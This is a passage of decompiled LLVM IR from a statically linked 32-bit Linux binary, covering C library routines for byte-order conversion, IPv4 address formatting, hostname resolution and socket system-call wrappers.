dec_label_pc_80526d0:                             ; preds = %entry, %dec_label_pc_805268d
  %v0_80526d0 = phi i32 [ %v3_805267f, %entry ], [ %v0_80526d0.pre, %dec_label_pc_805268d ]
  store i32 %v0_80526d0, i32* %eax.global-to-local, align 4
  %v2_80526d5 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80526d5, i32* @ebx, align 4
  store i32 %v0_8052668, i32* @esi, align 4
  ret i32 %v0_80526d0

; uselistorder directives
  uselistorder i32 %v0_80526d0, { 1, 0 }
  uselistorder i32 %v3_805267f, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80526d0, { 1, 0 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80526dc = trunc i32 %arg1 to i16
  %v2_80526dc = call i16 @llvm.bswap.i16(i16 %v1_80526dc)
  %v3_80526dc = zext i16 %v2_80526dc to i32
  ret i32 %v3_80526dc
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_80526e8 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_80526e8
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80526ef = trunc i32 %arg1 to i16
  %v2_80526ef = call i16 @llvm.bswap.i16(i16 %v1_80526ef)
  %v3_80526ef = zext i16 %v2_80526ef to i32
  ret i32 %v3_80526ef
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80526fb = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_80526fb
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052700 = load i32, i32* @edi, align 4
  %v0_8052701 = load i32, i32* @esi, align 4
  %v0_8052702 = load i32, i32* @ebx, align 4
  store i32 %v0_8052702, i32* %stack_var_-12, align 4
  store i32 0, i32* @edi, align 4
  %v1_805270d = add i32 %arg2, 15
  store i32 %v1_805270d, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_8052712 = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_8052712, 16777216
  %v1_8052714 = sdiv i32 %sext, 16777216
  store i32 %v1_8052714, i32* @ebx, align 4
  br label %dec_label_pc_8052718

dec_label_pc_8052718:                             ; preds = %entry, %dec_label_pc_805273d
  %v0_805271b17 = phi i32 [ %v1_8052714, %entry ], [ %v2_805273d, %dec_label_pc_805273d ]
  %v0_805274816 = phi i32 [ %v1_805270d, %entry ], [ %v0_8052741, %dec_label_pc_805273d ]
  %v1_805271d = urem i32 %v0_805271b17, 256
  %v5_805272b = inttoptr i32 %v0_805274816 to i8*
  %v6_805272b = call i32 @_uintmaxtostr(i8* %v5_805272b, i32 %v1_805271d, i32 0, i32 -10, i32 0)
  %v0_8052733 = load i32, i32* @esi, align 4
  %v1_8052733 = icmp eq i32 %v0_8052733, 0
  %v1_8052735 = add i32 %v6_805272b, -1
  store i32 %v1_8052735, i32* %ecx.global-to-local, align 4
  br i1 %v1_8052733, label %dec_label_pc_805273d, label %dec_label_pc_805273a

dec_label_pc_805273a:                             ; preds = %dec_label_pc_8052718
  %v1_805273a = inttoptr i32 %v0_8052733 to i8*
  store i8 46, i8* %v1_805273a, align 1
  %v0_8052741.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805273d

dec_label_pc_805273d:                             ; preds = %dec_label_pc_8052718, %dec_label_pc_805273a
  %v0_8052741 = phi i32 [ %v1_8052735, %dec_label_pc_8052718 ], [ %v0_8052741.pre, %dec_label_pc_805273a ]
  %v0_805273d = load i32, i32* @ebx, align 4
  %v2_805273d = udiv i32 %v0_805273d, 256
  store i32 %v2_805273d, i32* @ebx, align 4
  %v0_8052740 = load i32, i32* @edi, align 4
  %v1_8052740 = add i32 %v0_8052740, 1
  store i32 %v1_8052740, i32* @edi, align 4
  store i32 %v0_8052741, i32* @esi, align 4
  %v7_8052746 = icmp sgt i32 %v1_8052740, 3
  br i1 %v7_8052746, label %dec_label_pc_8052748, label %dec_label_pc_8052718

dec_label_pc_8052748:                             ; preds = %dec_label_pc_805273d
  %v1_8052748 = add i32 %v0_8052741, 1
  %v2_805274b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805274b, i32* @ebx, align 4
  store i32 %v0_8052701, i32* @esi, align 4
  store i32 %v0_8052700, i32* @edi, align 4
  ret i32 %v1_8052748

; uselistorder directives
  uselistorder i32 %v0_8052741, { 0, 2, 1 }
  uselistorder i32 %v1_8052714, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805273d, { 1, 0 }
  uselistorder label %dec_label_pc_8052718, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_805275b = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_8061564.494 to i32))
  ret i32 %v2_805275b
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_8052767 = ptrtoint i32* %stack_var_-4 to i32
  %v2_8052770 = inttoptr i32 %arg1 to i8*
  %v3_8052770 = call i32 @inet_aton(i8* %v2_8052770, i32 %v2_8052767)
  %v1_805277b = icmp eq i32 %v3_8052770, 0
  br i1 %v1_805277b, label %dec_label_pc_8052783, label %dec_label_pc_805277f

dec_label_pc_805277f:                             ; preds = %entry
  %v3_805277f = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052783

dec_label_pc_8052783:                             ; preds = %entry, %dec_label_pc_805277f
  %v0_8052783 = phi i32 [ -1, %entry ], [ %v3_805277f, %dec_label_pc_805277f ]
  ret i32 %v0_8052783

; uselistorder directives
  uselistorder label %dec_label_pc_8052783, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805278f = call i32 @__GI___h_errno_location()
  %v0_8052794 = load i32, i32* @edx, align 4
  %v2_8052797 = ptrtoint i32* %stack_var_-4 to i32
  %v9_80527af = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_806174c.496, i32 ptrtoint (i32* @global_var_8061580.495 to i32), i32 460, i32 %v2_8052797, i32 %v0_805278f, i32 %v0_8052794, i32 %v0_8052794)
  %v3_80527b4 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_80527b4
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_80527bc = load i32, i32* @ebp, align 4
  %v0_80527bd = load i32, i32* @edi, align 4
  %v0_80527be = load i32, i32* @esi, align 4
  %v0_80527bf = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_80527cf = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_80527cf, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_80527da = icmp eq i32 %arg1, 0
  br i1 %v4_80527da, label %dec_label_pc_8052ae6, label %dec_label_pc_80527e5

dec_label_pc_80527e5:                             ; preds = %entry
  %v1_80527e5 = call i32 @__errno_location(i32 %v0_80527bf)
  store i32 %v1_80527e5, i32* %eax.global-to-local, align 4
  store i32 %v1_80527e5, i32* @esi, align 4
  %v1_80527ec = inttoptr i32 %v1_80527e5 to i32*
  %v2_80527ec = load i32, i32* %v1_80527ec, align 4
  store i32 %v2_80527ec, i32* @edi, align 4
  store i32 0, i32* %v1_80527ec, align 4
  %v0_80527fd = load i32, i32* @ebx, align 4
  store i32 %v0_80527fd, i32* %stack_var_-108, align 4
  %v7_8052809 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_80527fd, i32 %arg5, i32 %arg6, i32 %v1_80527e5)
  store i32 %v7_8052809, i32* %eax.global-to-local, align 4
  %v1_8052811 = icmp eq i32 %v7_8052809, 0
  br i1 %v1_8052811, label %dec_label_pc_8052ae6, label %dec_label_pc_8052819

dec_label_pc_8052819:                             ; preds = %dec_label_pc_80527e5
  %v1_805281d = inttoptr i32 %arg6 to i32*
  %v2_805281d = load i32, i32* %v1_805281d, align 4
  store i32 %v2_805281d, i32* %edx.global-to-local, align 4
  %v9_805281f = icmp eq i32 %v2_805281d, 1
  br i1 %v9_805281f, label %dec_label_pc_8052839, label %dec_label_pc_8052824

dec_label_pc_8052824:                             ; preds = %dec_label_pc_8052819
  %v9_8052824 = icmp eq i32 %v2_805281d, 4
  br i1 %v9_8052824, label %dec_label_pc_8052839, label %dec_label_pc_8052829

dec_label_pc_8052829:                             ; preds = %dec_label_pc_8052824
  %v1_8052829 = add i32 %v2_805281d, 1
  %v8_8052829 = icmp eq i32 %v1_8052829, 0
  store i32 %v1_8052829, i32* %edx.global-to-local, align 4
  %v1_805282a = icmp eq i1 %v8_8052829, false
  br i1 %v1_805282a, label %dec_label_pc_8052ae6, label %dec_label_pc_8052830

dec_label_pc_8052830:                             ; preds = %dec_label_pc_8052829
  %v0_8052830 = load i32, i32* @esi, align 4
  %v1_8052830 = inttoptr i32 %v0_8052830 to i32*
  %v2_8052830 = load i32, i32* %v1_8052830, align 4
  %v11_8052830 = icmp eq i32 %v2_8052830, 2
  %v1_8052833 = icmp eq i1 %v11_8052830, false
  br i1 %v1_8052833, label %dec_label_pc_8052ae6, label %dec_label_pc_8052839

dec_label_pc_8052839:                             ; preds = %dec_label_pc_8052830, %dec_label_pc_8052824, %dec_label_pc_8052819
  %v0_8052839 = load i32, i32* @ebp, align 4
  store i32 %v0_8052839, i32* %eax.global-to-local, align 4
  %v0_805283b = load i32, i32* @edi, align 4
  %v1_805283b = load i32, i32* @esi, align 4
  %v2_805283b = inttoptr i32 %v1_805283b to i32*
  store i32 %v0_805283b, i32* %v2_805283b, align 4
  %v0_805283d = load i32, i32* %eax.global-to-local, align 4
  %v1_805283d = sub i32 0, %v0_805283d
  %v1_805283f = urem i32 %v1_805283d, 4
  %v2_805283f = icmp eq i32 %v1_805283f, 0
  store i32 %v1_805283f, i32* %eax.global-to-local, align 4
  %v0_8052854.pre = load i32, i32* @ebx, align 4
  br i1 %v2_805283f, label %dec_label_pc_8052850, label %dec_label_pc_8052844

dec_label_pc_8052844:                             ; preds = %dec_label_pc_8052839
  %v2_8052844 = sub i32 %v0_8052854.pre, %v1_805283f
  %v7_8052844 = icmp ult i32 %v0_8052854.pre, %v1_805283f
  br i1 %v7_8052844, label %dec_label_pc_8052ae1, label %dec_label_pc_805284c

dec_label_pc_805284c:                             ; preds = %dec_label_pc_8052844
  %v0_805284c = load i32, i32* @ebp, align 4
  %v2_805284c = add i32 %v0_805284c, %v1_805283f
  store i32 %v2_805284c, i32* @ebp, align 4
  store i32 %v2_8052844, i32* @ebx, align 4
  br label %dec_label_pc_8052850

dec_label_pc_8052850:                             ; preds = %dec_label_pc_8052839, %dec_label_pc_805284c
  %v0_8052854 = phi i32 [ %v2_8052844, %dec_label_pc_805284c ], [ %v0_8052854.pre, %dec_label_pc_8052839 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_805281d, align 4
  %tmp43 = icmp ult i32 %v0_8052854, 4
  br i1 %tmp43, label %dec_label_pc_8052ae1, label %dec_label_pc_8052863

dec_label_pc_8052863:                             ; preds = %dec_label_pc_8052850
  %v0_8052863 = load i32, i32* @ebx, align 4
  %v1_8052863 = add i32 %v0_8052863, -4
  store i32 %v1_8052863, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_8052863, 8
  br i1 %tmp44, label %dec_label_pc_8052ae1, label %dec_label_pc_805286f

dec_label_pc_805286f:                             ; preds = %dec_label_pc_8052863
  %v0_805286f = load i32, i32* @ebp, align 4
  %v1_805286f = add i32 %v0_805286f, 4
  store i32 %v1_805286f, i32* %edx.global-to-local, align 4
  %v1_8052872 = add i32 %v0_8052863, -12
  store i32 %v1_8052872, i32* %eax.global-to-local, align 4
  store i32 %v1_805286f, i32* %stack_var_-92, align 4
  %v3_805287b = inttoptr i32 %v1_805286f to i32*
  store i32 %v0_805286f, i32* %v3_805287b, align 4
  %v0_805287e = load i32, i32* %edx.global-to-local, align 4
  %v1_805287e = add i32 %v0_805287e, 4
  %v2_805287e = inttoptr i32 %v1_805287e to i32*
  store i32 0, i32* %v2_805287e, align 4
  %tmp45 = icmp ult i32 %v1_8052872, 32
  br i1 %tmp45, label %dec_label_pc_8052ae1, label %dec_label_pc_805288b

dec_label_pc_805288b:                             ; preds = %dec_label_pc_805286f
  %v0_805288b = load i32, i32* @ebx, align 4
  %v1_805288b = add i32 %v0_805288b, -44
  store i32 %v1_805288b, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_805288b, 256
  br i1 %tmp46, label %dec_label_pc_8052ae1, label %dec_label_pc_805289e

dec_label_pc_805289e:                             ; preds = %dec_label_pc_805288b
  %v0_805289e = load i32, i32* @ebp, align 4
  %v1_805289e = add i32 %v0_805289e, 12
  %v1_80528a1 = add i32 %v0_805289e, 44
  store i32 %v1_80528a1, i32* @edi, align 4
  store i32 %v1_80528a1, i32* %stack_var_-108, align 4
  %v3_80528b2 = inttoptr i32 %v1_80528a1 to i8*
  %v4_80528b2 = call i32 @strncpy(i8* %v3_80528b2, i32 %arg1, i32 %v1_805288b)
  %v0_80528b7 = load i32, i32* @edi, align 4
  %v1_80528b7 = load i32, i32* @ebp, align 4
  %v2_80528b7 = add i32 %v1_80528b7, 12
  %v3_80528b7 = inttoptr i32 %v2_80528b7 to i32*
  store i32 %v0_80528b7, i32* %v3_80528b7, align 4
  %v1_80528be = add i32 %v0_805289e, 16
  %v2_80528be = inttoptr i32 %v1_80528be to i32*
  store i32 0, i32* %v2_80528be, align 4
  %v2_80528c5 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_80528c5, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_80528c7 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_80528cc = inttoptr i32 %arg1 to i8*
  %v3_80528cc = call i32 @inet_aton(i8* %v2_80528cc, i32 %v0_80528c7)
  store i32 %v3_80528cc, i32* %eax.global-to-local, align 4
  %v1_80528d4 = icmp eq i32 %v3_80528cc, 0
  br i1 %v1_80528d4, label %dec_label_pc_8052910, label %dec_label_pc_80528d8

dec_label_pc_80528d8:                             ; preds = %dec_label_pc_805289e
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_80528dc = load i32, i32* @edi, align 4
  store i32 %v0_80528dc, i32* %arg2, align 4
  %v1_80528de = add i32 %tmp18, 8
  %v2_80528de = inttoptr i32 %v1_80528de to i32*
  store i32 2, i32* %v2_80528de, align 4
  %v0_80528e5 = load i32, i32* %edx.global-to-local, align 4
  %v1_80528e5 = add i32 %v0_80528e5, 12
  %v2_80528e5 = inttoptr i32 %v1_80528e5 to i32*
  store i32 4, i32* %v2_80528e5, align 4
  %v2_80528ec = load i32, i32* %stack_var_-92, align 4
  %v1_80528ef = load i32, i32* %edx.global-to-local, align 4
  %v2_80528ef = add i32 %v1_80528ef, 16
  %v3_80528ef = inttoptr i32 %v2_80528ef to i32*
  store i32 %v2_80528ec, i32* %v3_80528ef, align 4
  %v1_80528f6 = load i32, i32* %edx.global-to-local, align 4
  %v2_80528f6 = add i32 %v1_80528f6, 4
  %v3_80528f6 = inttoptr i32 %v2_80528f6 to i32*
  store i32 %v1_805289e, i32* %v3_80528f6, align 4
  %v0_80528fd = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80528fd, i32* %v1_80527cf, align 4
  store i32 0, i32* %v1_805281d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052ae6

dec_label_pc_8052910:                             ; preds = %dec_label_pc_805289e
  %v0_8052910 = call i32 @__open_nameservers()
  store i32 %v0_8052910, i32* @eax, align 4
  %v2_8052920 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8052920, i32* @ebx, align 4
  store i32 %v2_8052920, i32* %stack_var_-108, align 4
  %v2_8052925 = call i32 @__pthread_return_void(i32 %v2_8052920, i32 134563799)
  store i32 %v2_8052925, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b4e8.497 to i32), i32* %stack_var_-108, align 4
  %v1_8052931 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b4e8.497 to i32))
  store i32 ptrtoint (i32* @global_var_805b4e8.497 to i32), i32* @ecx, align 4
  store i32 134563799, i32* @eax, align 4
  store i32 %v2_8052920, i32* %stack_var_-108, align 4
  %v0_805293b = load i32, i32* @global_var_8061bd4.498, align 4
  store i32 %v0_805293b, i32* @esi, align 4
  %v2_8052941 = call i32 @__pthread_return_void(i32 %v2_8052920, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_805295c = ptrtoint i32* %stack_var_-76 to i32
  %v2_8052961 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8052961, i32* %eax.global-to-local, align 4
  store i32 %v2_8052961, i32* %stack_var_-108, align 4
  %v0_805296b = load i32, i32* @esi, align 4
  %v7_8052972 = call i32 @__dns_lookup(i8* %v2_80528cc, i32 1, i32 %v0_805296b, i32 ptrtoint (i32* @global_var_8061bc8.499 to i32), i32 %v2_8052961, i32 %v2_805295c)
  store i32 %v7_8052972, i32* %eax.global-to-local, align 4
  %v2_805297a = icmp slt i32 %v7_8052972, 0
  %v1_805297c = icmp eq i1 %v2_805297a, false
  br i1 %v1_805297c, label %dec_label_pc_8052992, label %dec_label_pc_805297e

dec_label_pc_805297e:                             ; preds = %dec_label_pc_8052910
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_805281d, align 4
  br label %dec_label_pc_8052ae6

dec_label_pc_8052992:                             ; preds = %dec_label_pc_8052910
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_80529a5 = icmp ugt i32 %v1_805288b, 256
  %v15_80529a5 = icmp eq i32 %v0_805288b, 300
  %v2_80529a9 = or i1 %v15_80529a5, %v10_80529a5
  br i1 %v2_80529a9, label %dec_label_pc_8052a44, label %dec_label_pc_80529ab

dec_label_pc_80529ab:                             ; preds = %dec_label_pc_8052992
  %v3_80529ae = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_80529ae, i32* %stack_var_-108, align 4
  %v1_80529b2 = call i32 @free(i32 %v3_80529ae)
  store i32 %v1_80529b2, i32* %eax.global-to-local, align 4
  store i32 %v3_80529ae, i32* @edi, align 4
  %v3_80529b8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_80529b8, i32* %stack_var_-108, align 4
  %v1_80529bc = call i32 @free(i32 %v3_80529b8)
  store i32 -1, i32* %v1_805281d, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052abc

dec_label_pc_8052a44:                             ; preds = %dec_label_pc_8052992
  %v3_8052a49.pre = load i32, i32* %stack_var_-76, align 4
  %v0_8052a4d.pre = load i32, i32* @edi, align 4
  store i32 %v0_8052a4d.pre, i32* %stack_var_-108, align 4
  %v3_8052a4e = inttoptr i32 %v0_8052a4d.pre to i8*
  %v4_8052a4e = call i32 @strncpy(i8* %v3_8052a4e, i32 %v3_8052a49.pre, i32 %v1_805288b)
  store i32 %v4_8052a4e, i32* %eax.global-to-local, align 4
  %v3_8052a54 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8052a54, i32* %stack_var_-108, align 4
  %v1_8052a58 = call i32 @free(i32 %v3_8052a54)
  store i32 %v1_8052a58, i32* %eax.global-to-local, align 4
  %v12_8052a60 = icmp eq i32 %tmp10, 1
  %v1_8052a65 = icmp eq i1 %v12_8052a60, false
  br i1 %v1_8052a65, label %dec_label_pc_8052ac1, label %dec_label_pc_8052a67

dec_label_pc_8052a67:                             ; preds = %dec_label_pc_8052a44
  %v0_8052a67 = load i32, i32* @edx, align 4
  %v0_8052a6e = load i32, i32* @ebp, align 4
  store i32 %v0_8052a6e, i32* %stack_var_-108, align 4
  %v3_8052a6f = inttoptr i32 %tmp to i16*
  %v4_8052a6f = call i32 @memcpy(i16* %v3_8052a6f, i32 4, i32 %v0_8052a67)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8052a78 = load i32, i32* @edi, align 4
  store i32 %v0_8052a78, i32* %arg2, align 4
  %v1_8052a7a = add i32 %tmp18, 8
  %v2_8052a7a = inttoptr i32 %v1_8052a7a to i32*
  store i32 2, i32* %v2_8052a7a, align 4
  %v0_8052a81 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052a81 = add i32 %v0_8052a81, 12
  %v2_8052a81 = inttoptr i32 %v1_8052a81 to i32*
  store i32 4, i32* %v2_8052a81, align 4
  %v3_8052a88 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_8052a88, i32* %edx.global-to-local, align 4
  %v1_8052a8c = load i32, i32* %eax.global-to-local, align 4
  %v2_8052a8c = add i32 %v1_8052a8c, 16
  %v3_8052a8c = inttoptr i32 %v2_8052a8c to i32*
  store i32 %v3_8052a88, i32* %v3_8052a8c, align 4
  %v1_8052a93 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052a93 = add i32 %v1_8052a93, 4
  %v3_8052a93 = inttoptr i32 %v2_8052a93 to i32*
  store i32 %v1_805289e, i32* %v3_8052a93, align 4
  %v2_8052a96 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8052a96, i32* %eax.global-to-local, align 4
  %v3_8052a97 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052a97, i32* %stack_var_-108, align 4
  %v1_8052a9b = call i32 @free(i32 %v3_8052a97)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_80527cf, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_805281d, align 4
  br label %dec_label_pc_8052abc

dec_label_pc_8052abc:                             ; preds = %dec_label_pc_8052ac1, %dec_label_pc_80529ab, %dec_label_pc_8052a67
  br label %dec_label_pc_8052ae6

dec_label_pc_8052ac1:                             ; preds = %dec_label_pc_8052a44
  %v3_8052ac4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052ac4, i32* %stack_var_-108, align 4
  %v1_8052ac8 = call i32 @free(i32 %v3_8052ac4)
  store i32 1, i32* %v1_805281d, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052abc

dec_label_pc_8052ae1:                             ; preds = %dec_label_pc_805288b, %dec_label_pc_805286f, %dec_label_pc_8052863, %dec_label_pc_8052850, %dec_label_pc_8052844
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052ae6

dec_label_pc_8052ae6:                             ; preds = %dec_label_pc_8052830, %dec_label_pc_8052829, %dec_label_pc_80527e5, %entry, %dec_label_pc_8052abc, %dec_label_pc_805297e, %dec_label_pc_80528d8, %dec_label_pc_8052ae1
  store i32 %v0_80527bf, i32* @ebx, align 4
  store i32 %v0_80527be, i32* @esi, align 4
  store i32 %v0_80527bd, i32* @edi, align 4
  store i32 %v0_80527bc, i32* @ebp, align 4
  %v0_8052aed = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8052aed

; uselistorder directives
  uselistorder i32 %v2_8052920, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_80528a1, { 1, 0, 2 }
  uselistorder i32 %v1_805289e, { 1, 0 }
  uselistorder i32 %v1_805288b, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8052854.pre, { 0, 2, 1 }
  uselistorder i32 %v1_805283f, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_805281d, { 2, 0, 1, 3 }
  uselistorder i32* %v1_805281d, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_80527cf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8052ae6, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052abc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052850, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052b0b = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052b12 = call i32 @__socketcall(i32 3, i32 %v2_8052b0b)
  ret i32 %v2_8052b12

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052b37 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052b3e = call i32 @__socketcall(i32 6, i32 %v2_8052b37)
  ret i32 %v2_8052b3e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8052b73 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8052b7a = call i32 @__socketcall(i32 15, i32 %v2_8052b73)
  ret i32 %v2_8052b7a

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8052ba7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8052bae = call i32 @__socketcall(i32 10, i32 %v2_8052ba7)
  ret i32 %v2_8052bae

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8052bdb = ptrtoint i32* %stack_var_-16 to i32
  %v2_8052be2 = call i32 @__socketcall(i32 9, i32 %v2_8052bdb)
  ret i32 %v2_8052be2

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8052c1f = ptrtoint i32* %stack_var_-24 to i32
  %v2_8052c26 = call i32 @__socketcall(i32 11, i32 %v2_8052c1f)
  ret i32 %v2_8052c26

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8052c5b = ptrtoint i32* %stack_var_-20 to i32
  %v2_8052c62 = call i32 @__socketcall(i32 14, i32 %v2_8052c5b)
  ret i32 %v2_8052c62

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052c87 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052c8e = call i32 @__socketcall(i32 1, i32 %v2_8052c87)
  ret i32 %v2_8052c8e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 6, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8052cb0, label %dec_label_pc_8052ca3

dec_label_pc_8052ca3:                             ; preds = %entry
  %v1_8052ca3 = add i32 %arg1, -64
